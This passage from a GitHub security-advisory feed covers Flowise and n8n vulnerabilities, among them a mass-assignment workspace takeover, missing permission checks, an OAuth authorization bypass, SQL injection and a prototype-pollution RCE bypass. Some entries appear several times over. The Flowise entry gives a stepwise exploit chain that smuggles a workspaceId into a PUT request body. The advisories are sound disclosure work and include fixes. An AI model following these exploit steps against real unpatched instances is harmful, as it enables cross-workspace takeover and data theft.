<p><strong>Type:</strong> Mass assignment via <code>Object.assign(entity, body)</code> -&gt; client-controlled <code>workspaceId</code> (and on create, <code>id</code>) overwritten on the Assistant entity -&gt; cross-workspace data takeover and IDOR.
<strong>File:</strong> <code>packages/server/src/services/assistants/index.ts</code>
<strong>Root cause:</strong> The Assistant controller/service constructs a <code>new Assistant()</code> and copies the request body into it via <code>Object.assign(...)</code> without an explicit field allowlist. The request body therefore can include <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, <code>updatedDate</code>. The server only rebinds <em>some</em> of these after the assign (e.g. on create, it overwrites <code>workspaceId</code> but not <code>id</code>; on update, it overwrites <code>id</code> but not <code>workspaceId</code>). The remaining client-controlled values land directly on the persisted row, breaking workspace isolation. Same root pattern as the assistant entity's sibling controllers and as <code>DocumentStore</code> before it was patched in commit 840d2ae.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>packages/server/src/services/assistants/index.ts</code></p>
<pre><code class="language-ts">// create (line 303) and update (line 381)
Object.assign(newAssistant, requestBody) // &lt;-- BUG: requestBody.id, requestBody.workspaceId accepted
</code></pre>
<p><strong>Why it's wrong:</strong> <code>Object.assign(target, source)</code> copies every own enumerable property of <code>source</code> onto <code>target</code>. The TypeORM/SQL persistence layer below it does not strip ownership-bearing columns, so <code>workspaceId</code> set in the request body lands as the new <code>workspaceId</code> of the persisted row. The DocumentStore patch (commit 840d2ae) demonstrated the intended fix shape (explicit field-by-field allowlist) but it has not been applied to this entity.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker is an authenticated member of workspace A. They have a session cookie / JWT for the Flowise web UI. State at this point: attacker can read and write entities scoped to workspace A.</li>
<li>Attacker creates a assistant in workspace A via the documented API (or reuses an existing one they own). They note its entity <code>id</code>.</li>
<li>Attacker issues a <code>PUT /api/v1/assistants/&lt;id&gt;</code> (or equivalent endpoint) with a JSON body that includes <code>"workspaceId": "&lt;workspace-B-id&gt;"</code> (an arbitrary other workspace's UUID). State at this point: the request reaches the controller as a workspace-A authenticated request.</li>
<li>The controller calls <code>Object.assign(updateEntity, body)</code>. The body's <code>workspaceId</code> overwrites the entity's <code>workspaceId</code> field. The persistence layer commits the row.</li>
<li>Final state: the assistant row is now owned by workspace B. Workspace B members can see it, modify it, and use it. Workspace A loses access (it no longer satisfies their workspace filter). The original creator's workspace audit shows nothing because the operation looked like a normal update.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> High. Cross-workspace boundary violation by any authenticated workspace member.
<strong>Attacker capability:</strong> Any authenticated user with permission to update a assistant can move it to any workspace whose UUID they can guess or enumerate (workspace UUIDs are exposed in many API responses, so enumeration is trivial). Assistants encapsulate LLM configuration, instructions, attached tools, and credentials. Cross-workspace movement via <code>workspaceId</code> overwrite exposes the assistant (including its system prompt and tool list) to the destination workspace.
<strong>Preconditions:</strong> Authenticated session with edit permission for the source assistant. No second factor required. Workspace UUIDs are exposed via the <code>/api/v1/workspaces</code> listing or via any cross-referenced object's <code>workspaceId</code> field, so target enumeration is trivial.
<strong>Differential:</strong> PoC-verified by source inspection of the original GHSA-q4pr-4r26-c69r. Patched build (with the suggested fix below) refuses the <code>workspaceId</code> field; vulnerable build accepts it and persists it.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Already fixed in PR <a href="https://github.com/FlowiseAI/Flowise/pull/6128">https://github.com/FlowiseAI/Flowise/pull/6128</a> (allowlist pattern applied).</p>
<pre><code class="language-ts">// Allowlist pattern (matches commit 840d2ae for DocumentStore):
const updatedAssistant = new Assistant()
if (body.&lt;allowed_field_1&gt; !== undefined) updatedAssistant.&lt;allowed_field_1&gt; = body.&lt;allowed_field_1&gt;
if (body.&lt;allowed_field_2&gt; !== undefined) updatedAssistant.&lt;allowed_field_2&gt; = body.&lt;allowed_field_2&gt;
// ...whitelist only the documented fields. Never copy id, workspaceId, createdDate, updatedDate from the client.
</code></pre>
<p>Regression tests should assert that a request body containing <code>workspaceId</code>, <code>id</code>, <code>createdDate</code>, or <code>updatedDate</code> is rejected (or at minimum: does not change those columns on the persisted row) for both create and update paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-78pr-c5x5-jggc">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-78pr-c5x5-jggc</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6128">https://github.com/FlowiseAI/Flowise/pull/6128</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/1cf247eab35c7c3d4db381d23e4dca682fba527b">https://github.com/FlowiseAI/Flowise/commit/1cf247eab35c7c3d4db381d23e4dca682fba527b</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-78pr-c5x5-jggc">https://github.com/advisories/GHSA-78pr-c5x5-jggc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78pr-c5x5-jggc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:19:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI: Vector Store No Permission Checks]]></title>
        <id>https://github.com/advisories/GHSA-hmg2-jjjx-jcp2</id>
        <link href="https://github.com/advisories/GHSA-hmg2-jjjx-jcp2"/>
        <updated>2026-05-14T16:19:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="finding-4-openai-assistants-vector-store---no-auth-on-crud-operations">FINDING 4: OpenAI Assistants Vector Store - No Auth on CRUD Operations</h3>
<p><strong>Severity</strong>: HIGH (CVSS ~8.1)
<strong>Type</strong>: CWE-306 (Missing Authentication for Critical Function)
<strong>File</strong>: <code>packages/server/src/routes/openai-assistants-vector-store/index.ts</code></p>
<p><strong>Description</strong>: ALL CRUD endpoints for OpenAI Assistants Vector Store have no authentication middleware AND the route path <code>/api/v1/openai-assistants-vector-store</code> is NOT in <code>WHITELIST_URLS</code>. However, it is also NOT protected by the main auth middleware when accessed via API key — the route requires API key auth (not whitelisted), but NO permission checks exist on any operation.</p>
<p>The real issue is that the routes have no <code>checkAnyPermission()</code> middleware, meaning any authenticated user regardless of role can:</p>
<ul>
<li>Create vector stores</li>
<li>Upload files to vector stores</li>
<li>Delete vector stores and files</li>
<li>Modify any vector store</li>
</ul>
<p><strong>Evidence</strong>:</p>
<pre><code class="language-typescript">// No permission middleware on any route
router.post('/', controller.createAssistantVectorStore)          // No permission check
router.put(['/', '/:id'], controller.updateAssistantVectorStore) // No permission check
router.delete(['/', '/:id'], controller.deleteAssistantVectorStore) // No permission check
router.post('/:id', getMulterStorage().array('files'), controller.uploadFilesToAssistantVectorStore) // No permission check
</code></pre>
<p><strong>Impact</strong>: Any authenticated user can manipulate OpenAI vector stores, upload malicious files, delete data, or exfiltrate stored documents regardless of their assigned permissions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-hmg2-jjjx-jcp2">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-hmg2-jjjx-jcp2</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-hmg2-jjjx-jcp2">https://github.com/advisories/GHSA-hmg2-jjjx-jcp2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hmg2-jjjx-jcp2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:19:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n Has a Cross-user Authorization Bypass in Dynamic Credential OAuth Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</id>
        <link href="https://github.com/advisories/GHSA-6h4j-wcr9-2vg7"/>
        <updated>2026-05-14T16:18:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>The OAuth1 and OAuth2 credential reconnect endpoints authorized access using <code>credential:read</code> rather than <code>credential:update</code>. An authenticated user with read-only access to a shared credential could initiate an OAuth reconnect flow and overwrite the stored token material for that credential with tokens bound to an external account they control. Workflows relying on the affected credential would subsequently execute under the attacker's OAuth identity, enabling data exfiltration to attacker-controlled external services and persistent takeover of shared integrations.</p>
<p>This issue affects instances where credentials are shared with other users or across projects.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.43, 2.20.7, and 2.21.1. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Restrict credential sharing to fully trusted users only.</li>
<li>Audit shared credentials for unexpected OAuth token changes and revoke any tokens that may have been replaced.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<hr>
<p>n8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backwards compatibility.</p>
<p>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-6h4j-wcr9-2vg7">https://github.com/n8n-io/n8n/security/advisories/GHSA-6h4j-wcr9-2vg7</a></li>
<li><a href="https://github.com/advisories/GHSA-6h4j-wcr9-2vg7">https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:18:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n Has a Cross-user Authorization Bypass in Dynamic Credential OAuth Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</id>
        <link href="https://github.com/advisories/GHSA-6h4j-wcr9-2vg7"/>
        <updated>2026-05-14T16:18:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>The OAuth1 and OAuth2 credential reconnect endpoints authorized access using <code>credential:read</code> rather than <code>credential:update</code>. An authenticated user with read-only access to a shared credential could initiate an OAuth reconnect flow and overwrite the stored token material for that credential with tokens bound to an external account they control. Workflows relying on the affected credential would subsequently execute under the attacker's OAuth identity, enabling data exfiltration to attacker-controlled external services and persistent takeover of shared integrations.</p>
<p>This issue affects instances where credentials are shared with other users or across projects.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.43, 2.20.7, and 2.21.1. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Restrict credential sharing to fully trusted users only.</li>
<li>Audit shared credentials for unexpected OAuth token changes and revoke any tokens that may have been replaced.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<hr>
<p>n8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backwards compatibility.</p>
<p>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-6h4j-wcr9-2vg7">https://github.com/n8n-io/n8n/security/advisories/GHSA-6h4j-wcr9-2vg7</a></li>
<li><a href="https://github.com/advisories/GHSA-6h4j-wcr9-2vg7">https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:18:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n Has a Cross-user Authorization Bypass in Dynamic Credential OAuth Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</id>
        <link href="https://github.com/advisories/GHSA-6h4j-wcr9-2vg7"/>
        <updated>2026-05-14T16:18:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>The OAuth1 and OAuth2 credential reconnect endpoints authorized access using <code>credential:read</code> rather than <code>credential:update</code>. An authenticated user with read-only access to a shared credential could initiate an OAuth reconnect flow and overwrite the stored token material for that credential with tokens bound to an external account they control. Workflows relying on the affected credential would subsequently execute under the attacker's OAuth identity, enabling data exfiltration to attacker-controlled external services and persistent takeover of shared integrations.</p>
<p>This issue affects instances where credentials are shared with other users or across projects.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.43, 2.20.7, and 2.21.1. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Restrict credential sharing to fully trusted users only.</li>
<li>Audit shared credentials for unexpected OAuth token changes and revoke any tokens that may have been replaced.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<hr>
<p>n8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backwards compatibility.</p>
<p>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-6h4j-wcr9-2vg7">https://github.com/n8n-io/n8n/security/advisories/GHSA-6h4j-wcr9-2vg7</a></li>
<li><a href="https://github.com/advisories/GHSA-6h4j-wcr9-2vg7">https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6h4j-wcr9-2vg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:18:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n Has a Source Control Pull SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-mhrx-qhrj-673w</id>
        <link href="https://github.com/advisories/GHSA-mhrx-qhrj-673w"/>
        <updated>2026-05-14T16:18:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An attacker with write access to the git repository connected to an n8n Source Control configuration could commit a malicious Data Table JSON file containing a crafted column name. When an administrator performed a Source Control Pull, n8n imported the file and could lead to SQL injection on the internal PostgreSQL instance.</p>
<p>Exploitation requires all of the following conditions:</p>
<ul>
<li>The n8n instance uses PostgreSQL as its database backend.</li>
<li>The Source Control feature is enabled and connected to a repository the attacker can write to.</li>
<li>An administrator triggers a Source Control Pull.</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n version 1.123.43, 2.20.7, and 2.21.1. Users should upgrade to this version or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Disable the Source Control feature if it is not actively required.</li>
<li>Restrict write access to the connected git repository to fully trusted users only.</li>
<li>Avoid pulling from repositories that may have been modified by untrusted parties.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-mhrx-qhrj-673w">https://github.com/n8n-io/n8n/security/advisories/GHSA-mhrx-qhrj-673w</a></li>
<li><a href="https://github.com/advisories/GHSA-mhrx-qhrj-673w">https://github.com/advisories/GHSA-mhrx-qhrj-673w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mhrx-qhrj-673w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:18:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n Has a Source Control Pull SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-mhrx-qhrj-673w</id>
        <link href="https://github.com/advisories/GHSA-mhrx-qhrj-673w"/>
        <updated>2026-05-14T16:18:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An attacker with write access to the git repository connected to an n8n Source Control configuration could commit a malicious Data Table JSON file containing a crafted column name. When an administrator performed a Source Control Pull, n8n imported the file and could lead to SQL injection on the internal PostgreSQL instance.</p>
<p>Exploitation requires all of the following conditions:</p>
<ul>
<li>The n8n instance uses PostgreSQL as its database backend.</li>
<li>The Source Control feature is enabled and connected to a repository the attacker can write to.</li>
<li>An administrator triggers a Source Control Pull.</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n version 1.123.43, 2.20.7, and 2.21.1. Users should upgrade to this version or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Disable the Source Control feature if it is not actively required.</li>
<li>Restrict write access to the connected git repository to fully trusted users only.</li>
<li>Avoid pulling from repositories that may have been modified by untrusted parties.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-mhrx-qhrj-673w">https://github.com/n8n-io/n8n/security/advisories/GHSA-mhrx-qhrj-673w</a></li>
<li><a href="https://github.com/advisories/GHSA-mhrx-qhrj-673w">https://github.com/advisories/GHSA-mhrx-qhrj-673w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mhrx-qhrj-673w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:18:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n Has a Source Control Pull SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-mhrx-qhrj-673w</id>
        <link href="https://github.com/advisories/GHSA-mhrx-qhrj-673w"/>
        <updated>2026-05-14T16:18:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An attacker with write access to the git repository connected to an n8n Source Control configuration could commit a malicious Data Table JSON file containing a crafted column name. When an administrator performed a Source Control Pull, n8n imported the file and could lead to SQL injection on the internal PostgreSQL instance.</p>
<p>Exploitation requires all of the following conditions:</p>
<ul>
<li>The n8n instance uses PostgreSQL as its database backend.</li>
<li>The Source Control feature is enabled and connected to a repository the attacker can write to.</li>
<li>An administrator triggers a Source Control Pull.</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n version 1.123.43, 2.20.7, and 2.21.1. Users should upgrade to this version or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Disable the Source Control feature if it is not actively required.</li>
<li>Restrict write access to the connected git repository to fully trusted users only.</li>
<li>Avoid pulling from repositories that may have been modified by untrusted parties.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-mhrx-qhrj-673w">https://github.com/n8n-io/n8n/security/advisories/GHSA-mhrx-qhrj-673w</a></li>
<li><a href="https://github.com/advisories/GHSA-mhrx-qhrj-673w">https://github.com/advisories/GHSA-mhrx-qhrj-673w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mhrx-qhrj-673w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T16:18:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n Has an XML Node Prototype Pollution Patch Bypass]]></title>
        <id>https://github.com/advisories/GHSA-wrwr-h859-xh2r</id>
        <link href="https://github.com/advisories/GHSA-wrwr-h859-xh2r"/>
        <updated>2026-05-14T16:17:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could bypass the patch for GHSA-hqr4-h3xv-9m3r in the XML node. When combined with other nodes, this could lead to RCE on the n8n host.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.43, 2.20.7, and 2.22.1. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the XML node by adding <code>n8n-nodes-base.xml</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<hr>
<p>n8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backwards compatibility.</p>
<p>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-wrwr-h859-xh2r">https://github.com/n8n-io/n8n/security/advisories/GHSA-wrwr-h859-xh2r</a></li>
<li><a href="https://github.com/advisories/GHSA-hqr4-h3xv-9m3r">https://github.com/advisories/GHSA-hqr4-h3xv-9m3r</a></li>
<li><a href="https://github.com/advisories/GHSA-wrwr-h859-xh2r">https://github.com/advisories/GHSA-wrwr-h859-xh2r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wrwr-h859-xh2r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-14T16:17:49.000Z</published>
    </entry>
</feed>